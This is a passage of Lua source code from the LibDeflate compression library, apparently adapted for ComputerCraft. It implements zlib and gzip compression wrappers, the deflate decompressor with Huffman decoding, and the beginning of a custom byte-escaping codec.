-- @see LibDeflate:DecompressZlib
function LibDeflate:CompressZlib(str, configs)
	local arg_valid, arg_err = IsValidArguments(str, false, nil, true, configs)
	if not arg_valid then
		error((""Usage: LibDeflate:CompressZlib(str, configs): ""
			..arg_err), 2)
	end
	return CompressZlibInternal(str, nil, configs)
end

--- Compress using the zlib format with a preset dictionary.
-- @param str [string] the data to be compressed.
-- @param dictionary [table] A preset dictionary produced
-- by LibDeflate:CreateDictionary()
-- @param configs [table/nil] The configuration table to control the compression
-- . If nil, use the default configuration.
-- @return [string] The compressed data.
-- @return [integer] The number of bits padded at the end of output.
-- Should always be 0.
-- Zlib formatted compressed data never has padding bits at the end.
-- @see compression_configs
-- @see LibDeflate:CreateDictionary
-- @see LibDeflate:DecompressZlibWithDict
function LibDeflate:CompressZlibWithDict(str, dictionary, configs)
	local arg_valid, arg_err = IsValidArguments(str, true, dictionary
		, true, configs)
	if not arg_valid then
		error((""Usage: LibDeflate:CompressZlibWithDict""
			..""(str, dictionary, configs): ""
			..arg_err), 2)
	end
	return CompressZlibInternal(str, dictionary, configs)
end

local function time()
    if os.epoch ~= nil then return math.floor(os.epoch(""utc"") / 1000)
        -- ComputerCraft's os.time() gives in-game time, os.epoch gives POSIX time in ms
    elseif os.time() < 30 then return 0 -- ComputerCraft 1.79 and below don't have os.epoch(), so no time.
    else return os.time() end -- All other Luas.
end

local function byte(num, b) return band(rshift(num, b * 8), 0xFF) end

--- Compress using the gzip format.
-- @param str [string] the data to be compressed.
-- @param configs [table/nil] The configuration table to control the compression
-- . If nil, use the default configuration.
-- @return [string] The compressed data with gzip headers.
-- @see compression_configs
-- @see LibDeflate:DecompressGzip
function LibDeflate:CompressGzip(str, configs)
    local arg_valid, arg_err = IsValidArguments(str, false, nil, true, configs)
	if not arg_valid then
		error((""Usage: LibDeflate:CompressGzip(str, configs): ""
			..arg_err), 2)
    end
    local res, err = CompressDeflateInternal(str, nil, configs)
    if res == nil then return res, err end
    local t = time()
    local cf = 0
    local crc = self:CRC32(str)
    local len = string.len(str)
    if configs ~= nil and configs.level ~= nil then
        if configs.level == 0 then cf = 0x04
        elseif configs.level == 9 then cf = 0x02 end
    end
    return string_char(0x1f, 0x8b, 8, 0, byte(t, 0), byte(t, 1), byte(t, 2), 
        byte(t, 3), cf, 0xFF) .. res .. string_char(byte(crc, 0), byte(crc, 1),
        byte(crc, 2), byte(crc, 3), byte(len, 0), byte(len, 1), byte(len, 2), byte(len, 3))
end

--[[ --------------------------------------------------------------------------
	Decompress code
--]] --------------------------------------------------------------------------

--[[
	Create a reader to easily reader stuffs as the unit of bits.
	Return values:
	1. ReadBits(bitlen)
	2. ReadBytes(bytelen, buffer, buffer_size)
	3. Decode(huffman_bitlen_count, huffman_symbol, min_bitlen)
	4. ReaderBitlenLeft()
	5. SkipToByteBoundary()
--]]
local function CreateReader(input_string)
	local input = input_string
	local input_strlen = #input_string
	local input_next_byte_pos = 1
	local cache_bitlen = 0
	local cache = 0

	-- Read some bits.
	-- To improve speed, this function does not
	-- check if the input has been exhausted.
	-- Use ReaderBitlenLeft() < 0 to check it.
	-- @param bitlen the number of bits to read
	-- @return the data is read.
	local function ReadBits(bitlen)
		local rshift_mask = _pow2[bitlen]
		local code
		if bitlen <= cache_bitlen then
			code = cache % rshift_mask
			cache = (cache - code) / rshift_mask
			cache_bitlen = cache_bitlen - bitlen
		else -- Whether input has been exhausted is not checked.
			local lshift_mask = _pow2[cache_bitlen]
			local byte1, byte2, byte3, byte4 = string_byte(input
				, input_next_byte_pos, input_next_byte_pos+3)
			-- This requires lua number to be at least double ()
			cache = cache + ((byte1 or 0)+(byte2 or 0)*256
				+ (byte3 or 0)*65536+(byte4 or 0)*16777216)*lshift_mask
			input_next_byte_pos = input_next_byte_pos + 4
			cache_bitlen = cache_bitlen + 32 - bitlen
			code = cache % rshift_mask
			cache = (cache - code) / rshift_mask
		end
		return code
	end

	-- Read some bytes from the reader.
	-- Assume reader is on the byte boundary.
	-- @param bytelen The number of bytes to be read.
	-- @param buffer The byte read will be stored into this buffer.
	-- @param buffer_size The buffer will be modified starting from
	--	buffer[buffer_size+1], ending at buffer[buffer_size+bytelen-1]
	-- @return the new buffer_size
	local function ReadBytes(bytelen, buffer, buffer_size)
		assert(cache_bitlen % 8 == 0)

		local byte_from_cache = (cache_bitlen/8 < bytelen)
			and (cache_bitlen/8) or bytelen
		for _=1, byte_from_cache do
			local byte = cache % 256
			buffer_size = buffer_size + 1
			buffer[buffer_size] = string_char(byte)
			cache = (cache - byte) / 256
		end
		cache_bitlen = cache_bitlen - byte_from_cache*8
		bytelen = bytelen - byte_from_cache
		if (input_strlen - input_next_byte_pos - bytelen + 1) * 8
			+ cache_bitlen < 0 then
			return -1 -- out of input
		end
		for i=input_next_byte_pos, input_next_byte_pos+bytelen-1 do
			buffer_size = buffer_size + 1
			buffer[buffer_size] = string_sub(input, i, i)
		end

		input_next_byte_pos = input_next_byte_pos + bytelen
		return buffer_size
	end

	-- Decode huffman code
	-- To improve speed, this function does not check
	-- if the input has been exhausted.
	-- Use ReaderBitlenLeft() < 0 to check it.
	-- Credits for Mark Adler. This code is from puff:Decode()
	-- @see puff:Decode(...)
	-- @param huffman_bitlen_count
	-- @param huffman_symbol
	-- @param min_bitlen The minimum huffman bit length of all symbols
	-- @return The decoded deflate code.
	--	Negative value is returned if decoding fails.
	local function Decode(huffman_bitlen_counts, huffman_symbols, min_bitlen)
		local code = 0
		local first = 0
		local index = 0
		local count
		if min_bitlen > 0 then
			if cache_bitlen < 15 and input then
				local lshift_mask = _pow2[cache_bitlen]
				local byte1, byte2, byte3, byte4 =
					string_byte(input, input_next_byte_pos
					, input_next_byte_pos+3)
				-- This requires lua number to be at least double ()
				cache = cache + ((byte1 or 0)+(byte2 or 0)*256
					+(byte3 or 0)*65536+(byte4 or 0)*16777216)*lshift_mask
				input_next_byte_pos = input_next_byte_pos + 4
				cache_bitlen = cache_bitlen + 32
			end

			local rshift_mask = _pow2[min_bitlen]
			cache_bitlen = cache_bitlen - min_bitlen
			code = cache % rshift_mask
			cache = (cache - code) / rshift_mask
			-- Reverse the bits
			code = _reverse_bits_tbl[min_bitlen][code]

			count = huffman_bitlen_counts[min_bitlen]
			if code < count then
				return huffman_symbols[code]
			end
			index = count
			first = count * 2
			code = code * 2
		end

		for bitlen = min_bitlen+1, 15 do
			local bit
			bit = cache % 2
			cache = (cache - bit) / 2
			cache_bitlen = cache_bitlen - 1

			code = (bit==1) and (code + 1 - code % 2) or code
			count = huffman_bitlen_counts[bitlen] or 0
			local diff = code - first
			if diff < count then
				return huffman_symbols[index + diff]
			end
			index = index + count
			first = first + count
			first = first * 2
			code = code * 2
		end
		-- invalid literal/length or distance code
		-- in fixed or dynamic block (run out of code)
		return -10
	end

	local function ReaderBitlenLeft()
		return (input_strlen - input_next_byte_pos + 1) * 8 + cache_bitlen
	end

	local function SkipToByteBoundary()
		local skipped_bitlen = cache_bitlen%8
		local rshift_mask = _pow2[skipped_bitlen]
		cache_bitlen = cache_bitlen - skipped_bitlen
		cache = (cache - cache % rshift_mask) / rshift_mask
	end

	return ReadBits, ReadBytes, Decode, ReaderBitlenLeft, SkipToByteBoundary
end

-- Create a deflate state, so I can pass in less arguments to functions.
-- @param str the whole string to be decompressed.
-- @param dictionary The preset dictionary. nil if not provided.
--		This dictionary should be produced by LibDeflate:CreateDictionary(str)
-- @return The decomrpess state.
local function CreateDecompressState(str, dictionary)
	local ReadBits, ReadBytes, Decode, ReaderBitlenLeft
		, SkipToByteBoundary = CreateReader(str)
	local state =
	{
		ReadBits = ReadBits,
		ReadBytes = ReadBytes,
		Decode = Decode,
		ReaderBitlenLeft = ReaderBitlenLeft,
		SkipToByteBoundary = SkipToByteBoundary,
		buffer_size = 0,
		buffer = {},
		result_buffer = {},
		dictionary = dictionary,
	}
	return state
end

-- Get the stuffs needed to decode huffman codes
-- @see puff.c:construct(...)
-- @param huffman_bitlen The huffman bit length of the huffman codes.
-- @param max_symbol The maximum symbol
-- @param max_bitlen The min huffman bit length of all codes
-- @return zero or positive for success, negative for failure.
-- @return The count of each huffman bit length.
-- @return A table to convert huffman codes to deflate codes.
-- @return The minimum huffman bit length.
local function GetHuffmanForDecode(huffman_bitlens, max_symbol, max_bitlen)
	local huffman_bitlen_counts = {}
	local min_bitlen = max_bitlen
	for symbol = 0, max_symbol do
		local bitlen = huffman_bitlens[symbol] or 0
		min_bitlen = (bitlen > 0 and bitlen < min_bitlen)
			and bitlen or min_bitlen
		huffman_bitlen_counts[bitlen] = (huffman_bitlen_counts[bitlen] or 0)+1
	end

	if huffman_bitlen_counts[0] == max_symbol+1 then -- No Codes
		return 0, huffman_bitlen_counts, {}, 0 -- Complete, but decode will fail
	end

	local left = 1
	for len = 1, max_bitlen do
		left = left * 2
		left = left - (huffman_bitlen_counts[len] or 0)
		if left < 0 then
			return left -- Over-subscribed, return negative
		end
	end

	-- Generate offsets info symbol table for each length for sorting
	local offsets = {}
	offsets[1] = 0
	for len = 1, max_bitlen-1 do
		offsets[len + 1] = offsets[len] + (huffman_bitlen_counts[len] or 0)
	end

	local huffman_symbols = {}
	for symbol = 0, max_symbol do
		local bitlen = huffman_bitlens[symbol] or 0
		if bitlen ~= 0 then
			local offset = offsets[bitlen]
			huffman_symbols[offset] = symbol
			offsets[bitlen] = offsets[bitlen] + 1
		end
	end

	-- Return zero for complete set, positive for incomplete set.
	return left, huffman_bitlen_counts, huffman_symbols, min_bitlen
end

-- Decode a fixed or dynamic huffman blocks, excluding last block identifier
-- and block type identifer.
-- @see puff.c:codes()
-- @param state decompression state that will be modified by this function.
--	@see CreateDecompressState
-- @param ... Read the source code
-- @return 0 on success, other value on failure.
local function DecodeUntilEndOfBlock(state, lcodes_huffman_bitlens
	, lcodes_huffman_symbols, lcodes_huffman_min_bitlen
	, dcodes_huffman_bitlens, dcodes_huffman_symbols
	, dcodes_huffman_min_bitlen)
	local buffer, buffer_size, ReadBits, Decode, ReaderBitlenLeft
		, result_buffer =
		state.buffer, state.buffer_size, state.ReadBits, state.Decode
		, state.ReaderBitlenLeft, state.result_buffer
	local dictionary = state.dictionary
	local dict_string_table
	local dict_strlen

	local buffer_end = 1
	if dictionary and not buffer[0] then
		-- If there is a dictionary, copy the last 258 bytes into
		-- the string_table to make the copy in the main loop quicker.
		-- This is done only once per decompression.
		dict_string_table = dictionary.string_table
		dict_strlen = dictionary.strlen
		buffer_end = -dict_strlen + 1
		for i=0, (-dict_strlen+1)<-257 and -257 or (-dict_strlen+1), -1 do
			buffer[i] = _byte_to_char[dict_string_table[dict_strlen+i]]
		end
	end

	repeat
		local symbol = Decode(lcodes_huffman_bitlens
			, lcodes_huffman_symbols, lcodes_huffman_min_bitlen)
		if symbol < 0 or symbol > 285 then
		-- invalid literal/length or distance code in fixed or dynamic block
			return -10
		elseif symbol < 256 then -- Literal
			buffer_size = buffer_size + 1
			buffer[buffer_size] = _byte_to_char[symbol]
		elseif symbol > 256 then -- Length code
			symbol = symbol - 256
			local bitlen = _literal_deflate_code_to_base_len[symbol]
			bitlen = (symbol >= 8)
				 and (bitlen
				 + ReadBits(_literal_deflate_code_to_extra_bitlen[symbol]))
					or bitlen
			symbol = Decode(dcodes_huffman_bitlens, dcodes_huffman_symbols
				, dcodes_huffman_min_bitlen)
			if symbol < 0 or symbol > 29 then
			-- invalid literal/length or distance code in fixed or dynamic block
				return -10
			end
			local dist = _dist_deflate_code_to_base_dist[symbol]
			dist = (dist > 4) and (dist
				+ ReadBits(_dist_deflate_code_to_extra_bitlen[symbol])) or dist

			local char_buffer_index = buffer_size-dist+1
			if char_buffer_index < buffer_end then
			-- distance is too far back in fixed or dynamic block
				return -11
			end
			if char_buffer_index >= -257 then
				for _=1, bitlen do
					buffer_size = buffer_size + 1
					buffer[buffer_size] = buffer[char_buffer_index]
					char_buffer_index = char_buffer_index + 1
				end
			else
				char_buffer_index = dict_strlen + char_buffer_index
				for _=1, bitlen do
					buffer_size = buffer_size + 1
					buffer[buffer_size] =
					_byte_to_char[dict_string_table[char_buffer_index]]
					char_buffer_index = char_buffer_index + 1
				end
			end
		end

		if ReaderBitlenLeft() < 0 then
			return 2 -- available inflate data did not terminate
		end

		if buffer_size >= 65536 then
			result_buffer[#result_buffer+1] =
				table_concat(buffer, """", 1, 32768)
			for i=32769, buffer_size do
				buffer[i-32768] = buffer[i]
			end
			buffer_size = buffer_size - 32768
			buffer[buffer_size+1] = nil
			-- NOTE: buffer[32769..end] and buffer[-257..0] are not cleared.
			-- This is why ""buffer_size"" variable is needed.
		end
	until symbol == 256

	state.buffer_size = buffer_size

	return 0
end

-- Decompress a store block
-- @param state decompression state that will be modified by this function.
-- @return 0 if succeeds, other value if fails.
local function DecompressStoreBlock(state)
	local buffer, buffer_size, ReadBits, ReadBytes, ReaderBitlenLeft
		, SkipToByteBoundary, result_buffer =
		state.buffer, state.buffer_size, state.ReadBits, state.ReadBytes
		, state.ReaderBitlenLeft, state.SkipToByteBoundary, state.result_buffer

	SkipToByteBoundary()
	local bytelen = ReadBits(16)
	if ReaderBitlenLeft() < 0 then
		return 2 -- available inflate data did not terminate
	end
	local bytelenComp = ReadBits(16)
	if ReaderBitlenLeft() < 0 then
		return 2 -- available inflate data did not terminate
	end

	if bytelen % 256 + bytelenComp % 256 ~= 255 then
		return -2 -- Not one's complement
	end
	if (bytelen-bytelen % 256)/256
		+ (bytelenComp-bytelenComp % 256)/256 ~= 255 then
		return -2 -- Not one's complement
	end

	-- Note that ReadBytes will skip to the next byte boundary first.
	buffer_size = ReadBytes(bytelen, buffer, buffer_size)
	if buffer_size < 0 then
		return 2 -- available inflate data did not terminate
	end

	-- memory clean up when there are enough bytes in the buffer.
	if buffer_size >= 65536 then
		result_buffer[#result_buffer+1] = table_concat(buffer, """", 1, 32768)
		for i=32769, buffer_size do
			buffer[i-32768] = buffer[i]
		end
		buffer_size = buffer_size - 32768
		buffer[buffer_size+1] = nil
	end
	state.buffer_size = buffer_size
	return 0
end

-- Decompress a fixed block
-- @param state decompression state that will be modified by this function.
-- @return 0 if succeeds other value if fails.
local function DecompressFixBlock(state)
	return DecodeUntilEndOfBlock(state
		, _fix_block_literal_huffman_bitlen_count
		, _fix_block_literal_huffman_to_deflate_code, 7
		, _fix_block_dist_huffman_bitlen_count
		, _fix_block_dist_huffman_to_deflate_code, 5)
end

-- Decompress a dynamic block
-- @param state decompression state that will be modified by this function.
-- @return 0 if success, other value if fails.
local function DecompressDynamicBlock(state)
	local ReadBits, Decode = state.ReadBits, state.Decode
	local nlen = ReadBits(5) + 257
	local ndist = ReadBits(5) + 1
	local ncode = ReadBits(4) + 4
	if nlen > 286 or ndist > 30 then
		-- dynamic block code description: too many length or distance codes
		return -3
	end

	local rle_codes_huffman_bitlens = {}

	for i = 1, ncode do
		rle_codes_huffman_bitlens[_rle_codes_huffman_bitlen_order[i]] =
			ReadBits(3)
	end

	local rle_codes_err, rle_codes_huffman_bitlen_counts,
		rle_codes_huffman_symbols, rle_codes_huffman_min_bitlen =
		GetHuffmanForDecode(rle_codes_huffman_bitlens, 18, 7)
	if rle_codes_err ~= 0 then -- Require complete code set here
		-- dynamic block code description: code lengths codes incomplete
		return -4
	end

	local lcodes_huffman_bitlens = {}
	local dcodes_huffman_bitlens = {}
	-- Read length/literal and distance code length tables
	local index = 0
	while index < nlen + ndist do
		local symbol -- Decoded value
		local bitlen -- Last length to repeat

		symbol = Decode(rle_codes_huffman_bitlen_counts
			, rle_codes_huffman_symbols, rle_codes_huffman_min_bitlen)

		if symbol < 0 then
			return symbol -- Invalid symbol
		elseif symbol < 16 then
			if index < nlen then
				lcodes_huffman_bitlens[index] = symbol
			else
				dcodes_huffman_bitlens[index-nlen] = symbol
			end
			index = index + 1
		else
			bitlen = 0
			if symbol == 16 then
				if index == 0 then
					-- dynamic block code description: repeat lengths
					-- with no first length
					return -5
				end
				if index-1 < nlen then
					bitlen = lcodes_huffman_bitlens[index-1]
				else
					bitlen = dcodes_huffman_bitlens[index-nlen-1]
				end
				symbol = 3 + ReadBits(2)
			elseif symbol == 17 then -- Repeat zero 3..10 times
				symbol = 3 + ReadBits(3)
			else -- == 18, repeat zero 11.138 times
				symbol = 11 + ReadBits(7)
			end
			if index + symbol > nlen + ndist then
				-- dynamic block code description:
				-- repeat more than specified lengths
				return -6
			end
			while symbol > 0 do -- Repeat last or zero symbol times
				symbol = symbol - 1
				if index < nlen then
					lcodes_huffman_bitlens[index] = bitlen
				else
					dcodes_huffman_bitlens[index-nlen] = bitlen
				end
				index = index + 1
			end
		end
	end

	if (lcodes_huffman_bitlens[256] or 0) == 0 then
		-- dynamic block code description: missing end-of-block code
		return -9
	end

	local lcodes_err, lcodes_huffman_bitlen_counts
		, lcodes_huffman_symbols, lcodes_huffman_min_bitlen =
		GetHuffmanForDecode(lcodes_huffman_bitlens, nlen-1, 15)
	--dynamic block code description: invalid literal/length code lengths,
	-- Incomplete code ok only for single length 1 code
	if (lcodes_err ~=0 and (lcodes_err < 0
		or nlen ~= (lcodes_huffman_bitlen_counts[0] or 0)
			+(lcodes_huffman_bitlen_counts[1] or 0))) then
		return -7
	end

	local dcodes_err, dcodes_huffman_bitlen_counts
		, dcodes_huffman_symbols, dcodes_huffman_min_bitlen =
		GetHuffmanForDecode(dcodes_huffman_bitlens, ndist-1, 15)
	-- dynamic block code description: invalid distance code lengths,
	-- Incomplete code ok only for single length 1 code
	if (dcodes_err ~=0 and (dcodes_err < 0
		or ndist ~= (dcodes_huffman_bitlen_counts[0] or 0)
			+ (dcodes_huffman_bitlen_counts[1] or 0))) then
		return -8
	end

	-- Build buffman table for literal/length codes
	return DecodeUntilEndOfBlock(state, lcodes_huffman_bitlen_counts
		, lcodes_huffman_symbols, lcodes_huffman_min_bitlen
		, dcodes_huffman_bitlen_counts, dcodes_huffman_symbols
		, dcodes_huffman_min_bitlen)
end

-- Decompress a deflate stream
-- @param state: a decompression state
-- @return the decompressed string if succeeds. nil if fails.
local function Inflate(state)
	local ReadBits = state.ReadBits

	local is_last_block
	while not is_last_block do
		is_last_block = (ReadBits(1) == 1)
		local block_type = ReadBits(2)
		local status
		if block_type == 0 then
			status = DecompressStoreBlock(state)
		elseif block_type == 1 then
			status = DecompressFixBlock(state)
		elseif block_type == 2 then
			status = DecompressDynamicBlock(state)
		else
			return nil, -1 -- invalid block type (type == 3)
		end
		if status ~= 0 then
			return nil, status
        end
        -- ComputerCraft requires this for long-running processes
        if os and os.pullEvent then
            os.queueEvent(""nosleep"")
            os.pullEvent()
        end
	end

	state.result_buffer[#state.result_buffer+1] =
		table_concat(state.buffer, """", 1, state.buffer_size)
	local result = table_concat(state.result_buffer)
	return result
end

-- @see LibDeflate:DecompressDeflate(str)
-- @see LibDeflate:DecompressDeflateWithDict(str, dictionary)
local function DecompressDeflateInternal(str, dictionary)
	local state = CreateDecompressState(str, dictionary)
	local result, status = Inflate(state)
	if not result then
		return nil, status
	end

	local bitlen_left = state.ReaderBitlenLeft()
	local bytelen_left = (bitlen_left - bitlen_left % 8) / 8
	return result, bytelen_left
end

-- @see LibDeflate:DecompressZlib(str)
-- @see LibDeflate:DecompressZlibWithDict(str)
local function DecompressZlibInternal(str, dictionary)
	local state = CreateDecompressState(str, dictionary)
	local ReadBits = state.ReadBits

	local CMF = ReadBits(8)
	if state.ReaderBitlenLeft() < 0 then
		return nil, 2 -- available inflate data did not terminate
	end
	local CM = CMF % 16
	local CINFO = (CMF - CM) / 16
	if CM ~= 8 then
		return nil, -12 -- invalid compression method
	end
	if CINFO > 7 then
		return nil, -13 -- invalid window size
	end

	local FLG = ReadBits(8)
	if state.ReaderBitlenLeft() < 0 then
		return nil, 2 -- available inflate data did not terminate
	end
	if (CMF*256+FLG)%31 ~= 0 then
		return nil, -14 -- invalid header checksum
	end

	local FDIST = ((FLG-FLG%32)/32 % 2)
	local FLEVEL = ((FLG-FLG%64)/64 % 4) -- luacheck: ignore FLEVEL

	if FDIST == 1 then
		if not dictionary then
			return nil, -16 -- need dictonary, but dictionary is not provided.
		end
		local byte3 = ReadBits(8)
		local byte2 = ReadBits(8)
		local byte1 = ReadBits(8)
		local byte0 = ReadBits(8)
		local actual_adler32 = byte3*16777216+byte2*65536+byte1*256+byte0
		if state.ReaderBitlenLeft() < 0 then
			return nil, 2 -- available inflate data did not terminate
		end
		if not IsEqualAdler32(actual_adler32, dictionary.adler32) then
			return nil, -17 -- dictionary adler32 does not match
		end
	end
	local result, status = Inflate(state)
	if not result then
		return nil, status
	end
	state.SkipToByteBoundary()

	local adler_byte0 = ReadBits(8)
	local adler_byte1 = ReadBits(8)
	local adler_byte2 = ReadBits(8)
	local adler_byte3 = ReadBits(8)
	if state.ReaderBitlenLeft() < 0 then
		return nil, 2 -- available inflate data did not terminate
	end

	local adler32_expected = adler_byte0*16777216
		+ adler_byte1*65536 + adler_byte2*256 + adler_byte3
	local adler32_actual = LibDeflate:Adler32(result)
	if not IsEqualAdler32(adler32_expected, adler32_actual) then
		return nil, -15 -- Adler32 checksum does not match
	end

	local bitlen_left = state.ReaderBitlenLeft()
	local bytelen_left = (bitlen_left - bitlen_left % 8) / 8
	return result, bytelen_left
end

--- Decompress a raw deflate compressed data.
-- @param str [string] The data to be decompressed.
-- @return [string/nil] If the decompression succeeds, return the decompressed
-- data. If the decompression fails, return nil. You should check if this return
-- value is non-nil to know if the decompression succeeds.
-- @return [integer] If the decompression succeeds, return the number of
-- unprocessed bytes in the input compressed data. This return value is a
-- positive integer if the input data is a valid compressed data appended by an
-- arbitary non-empty string. This return value is 0 if the input data does not
-- contain any extra bytes.<br>
-- If the decompression fails (The first return value of this function is nil),
-- this return value is undefined.
-- @see LibDeflate:CompressDeflate
function LibDeflate:DecompressDeflate(str)
	local arg_valid, arg_err = IsValidArguments(str)
	if not arg_valid then
		error((""Usage: LibDeflate:DecompressDeflate(str): ""
			..arg_err), 2)
	end
	return DecompressDeflateInternal(str)
end

--- Decompress a raw deflate compressed data with a preset dictionary.
-- @param str [string] The data to be decompressed.
-- @param dictionary [table] The preset dictionary used by
-- LibDeflate:CompressDeflateWithDict when the compressed data is produced.
-- Decompression and compression must use the same dictionary.
-- Otherwise wrong decompressed data could be produced without generating any
-- error.
-- @return [string/nil] If the decompression succeeds, return the decompressed
-- data. If the decompression fails, return nil. You should check if this return
-- value is non-nil to know if the decompression succeeds.
-- @return [integer] If the decompression succeeds, return the number of
-- unprocessed bytes in the input compressed data. This return value is a
-- positive integer if the input data is a valid compressed data appended by an
-- arbitary non-empty string. This return value is 0 if the input data does not
-- contain any extra bytes.<br>
-- If the decompression fails (The first return value of this function is nil),
-- this return value is undefined.
-- @see LibDeflate:CompressDeflateWithDict
function LibDeflate:DecompressDeflateWithDict(str, dictionary)
	local arg_valid, arg_err = IsValidArguments(str, true, dictionary)
	if not arg_valid then
		error((""Usage: LibDeflate:DecompressDeflateWithDict(str, dictionary): ""
			..arg_err), 2)
	end
	return DecompressDeflateInternal(str, dictionary)
end

--- Decompress a zlib compressed data.
-- @param str [string] The data to be decompressed
-- @return [string/nil] If the decompression succeeds, return the decompressed
-- data. If the decompression fails, return nil. You should check if this return
-- value is non-nil to know if the decompression succeeds.
-- @return [integer] If the decompression succeeds, return the number of
-- unprocessed bytes in the input compressed data. This return value is a
-- positive integer if the input data is a valid compressed data appended by an
-- arbitary non-empty string. This return value is 0 if the input data does not
-- contain any extra bytes.<br>
-- If the decompression fails (The first return value of this function is nil),
-- this return value is undefined.
-- @see LibDeflate:CompressZlib
function LibDeflate:DecompressZlib(str)
	local arg_valid, arg_err = IsValidArguments(str)
	if not arg_valid then
		error((""Usage: LibDeflate:DecompressZlib(str): ""
			..arg_err), 2)
	end
	return DecompressZlibInternal(str)
end

--- Decompress a zlib compressed data with a preset dictionary.
-- @param str [string] The data to be decompressed
-- @param dictionary [table] The preset dictionary used by
-- LibDeflate:CompressDeflateWithDict when the compressed data is produced.
-- Decompression and compression must use the same dictionary.
-- Otherwise wrong decompressed data could be produced without generating any
-- error.
-- @return [string/nil] If the decompression succeeds, return the decompressed
-- data. If the decompression fails, return nil. You should check if this return
-- value is non-nil to know if the decompression succeeds.
-- @return [integer] If the decompression succeeds, return the number of
-- unprocessed bytes in the input compressed data. This return value is a
-- positive integer if the input data is a valid compressed data appended by an
-- arbitary non-empty string. This return value is 0 if the input data does not
-- contain any extra bytes.<br>
-- If the decompression fails (The first return value of this function is nil),
-- this return value is undefined.
-- @see LibDeflate:CompressZlibWithDict
function LibDeflate:DecompressZlibWithDict(str, dictionary)
	local arg_valid, arg_err = IsValidArguments(str, true, dictionary)
	if not arg_valid then
		error((""Usage: LibDeflate:DecompressZlibWithDict(str, dictionary): ""
			..arg_err), 2)
	end
	return DecompressZlibInternal(str, dictionary)
end

-- Calculate the huffman code of fixed block
do
	_fix_block_literal_huffman_bitlen = {}
	for sym=0, 143 do
		_fix_block_literal_huffman_bitlen[sym] = 8
	end
	for sym=144, 255 do
		_fix_block_literal_huffman_bitlen[sym] = 9
	end
	for sym=256, 279 do
	    _fix_block_literal_huffman_bitlen[sym] = 7
	end
	for sym=280, 287 do
		_fix_block_literal_huffman_bitlen[sym] = 8
	end

	_fix_block_dist_huffman_bitlen = {}
	for dist=0, 31 do
		_fix_block_dist_huffman_bitlen[dist] = 5
	end
	local status
	status, _fix_block_literal_huffman_bitlen_count
		, _fix_block_literal_huffman_to_deflate_code =
		GetHuffmanForDecode(_fix_block_literal_huffman_bitlen, 287, 9)
	assert(status == 0)
	status, _fix_block_dist_huffman_bitlen_count,
		_fix_block_dist_huffman_to_deflate_code =
		GetHuffmanForDecode(_fix_block_dist_huffman_bitlen, 31, 5)
	assert(status == 0)

	_fix_block_literal_huffman_code =
		GetHuffmanCodeFromBitlen(_fix_block_literal_huffman_bitlen_count
		, _fix_block_literal_huffman_bitlen, 287, 9)
	_fix_block_dist_huffman_code =
		GetHuffmanCodeFromBitlen(_fix_block_dist_huffman_bitlen_count
		, _fix_block_dist_huffman_bitlen, 31, 5)
end

--- Decompress a gzip compressed data.
-- @param str [string] The data to be decompressed
-- @return [string/nil] If the decompression succeeds, return the decompressed
-- data. If the decompression fails, return nil. You should check if this return
-- value is non-nil to know if the decompression succeeds.
-- @return [integer] If the decompression succeeds, return the number of
-- unprocessed bytes in the input compressed data. This return value is a
-- positive integer if the input data is a valid compressed data appended by an
-- arbitary non-empty string. This return value is 0 if the input data does not
-- contain any extra bytes.<br>
-- If the decompression fails (The first return value of this function is nil),
-- this return value is undefined.
function LibDeflate:DecompressGzip(str)
	local arg_valid, arg_err = IsValidArguments(str)
	if not arg_valid then
		error((""Usage: LibDeflate:DecompressGzip(str): ""..arg_err), 2)
	end
	if string_byte(string.sub(str, 1, 1)) ~= 31 or string_byte(string.sub(str, 2, 2)) ~= 139 then
		return nil, -1
    end
    if band(string_byte(string.sub(str, 4, 4)), 0xE0) ~= 0 then
        return nil, -3
    end
    if string_byte(string.sub(str, 3, 3)) ~= 8 then
        return nil, -4
    end 
    local offset = 10
	if band(string_byte(string.sub(str, 4, 4)), 4) == 4 then 
		offset = offset + string_byte(string.sub(str, 11, 11)) * 256 + string_byte(string.sub(str, 12, 12)) 
    end
    if band(string_byte(string.sub(str, 4, 4)), 8) == 8 then
        while string_byte(string.sub(str, offset, offset)) ~= 0 do offset = offset + 1 end
    end
    if band(string_byte(string.sub(str, 4, 4)), 16) == 16 then
        while string_byte(string.sub(str, offset, offset)) ~= 0 do offset = offset + 1 end
    end
    if band(string_byte(string.sub(str, 4, 4)), 2) == 2 then
        local src_checksum = string_byte(string.sub(str, offset + 1, offset + 1)) * 256 + string_byte(string.sub(str, offset, offset)) 
        local target_checksum = band(self:CRC32(string.sub(str, 1, offset - 1)), 0xFFFF)
        if xor(src_checksum, target_checksum) ~= 0xFFFF then return nil, -5 end
        offset = offset + 2
    end
    local res, err = DecompressDeflateInternal(string.sub(str, offset + 1, -8))
    if res == nil then return res, err end
    local src_checksum = string_byte(string.sub(str, -5, -5)) * 0x1000000 + string_byte(string.sub(str, -6, -6)) * 0x10000 + string_byte(string.sub(str, -7, -7)) * 256 + string_byte(string.sub(str, -8, -8))
    src_checksum = bnot(src_checksum)
    local target_checksum = self:CRC32(res)
    if xor(src_checksum, target_checksum) ~= 0xFFFFFFFF then return nil, -2 end
    return res
end

-- Encoding algorithms
-- Prefix encoding algorithm
-- implemented by Galmok of European Stormrage (Horde), galmok@gmail.com
-- From LibCompress <https://www.wowace.com/projects/libcompress>,
-- which is licensed under GPLv2
-- The code has been modified by the author of LibDeflate.
------------------------------------------------------------------------------

-- to be able to match any requested byte value, the search
-- string must be preprocessed characters to escape with %:
-- ( ) . % + - * ? [ ] ^ $
-- ""illegal"" byte values:
-- 0 is replaces %z
local _gsub_escape_table = {
	[""\000""] = ""%z"", [""(""] = ""%("", ["")""] = ""%)"", ["".""] = ""%."",
	[""%""] = ""%%"", [""+""] = ""%+"", [""-""] = ""%-"", [""*""] = ""%*"",
	[""?""] = ""%?"", [""[""] = ""%["", [""]""] = ""%]"", [""^""] = ""%^"",
	[""$""] = ""%$"",
}

local function escape_for_gsub(str)
	return str:gsub(""([%z%(%)%.%%%+%-%*%?%[%]%^%$])"", _gsub_escape_table)
end

--- Create a custom codec with encoder and decoder. <br>
-- This codec is used to convert an input string to make it not contain
-- some specific bytes.
-- This created codec and the parameters of this function do NOT take
-- localization into account. One byte (0-255) in the string is exactly one
-- character (0-255).
-- Credits to LibCompress.
-- @param reserved_chars [string] The created encoder will ensure encoded
-- data does not contain any single character in reserved_chars. This parameter
-- should be non-empty.
-- @param escape_chars [string] The escape character(s) used in the created
-- codec. The codec converts any character included in reserved\_chars /
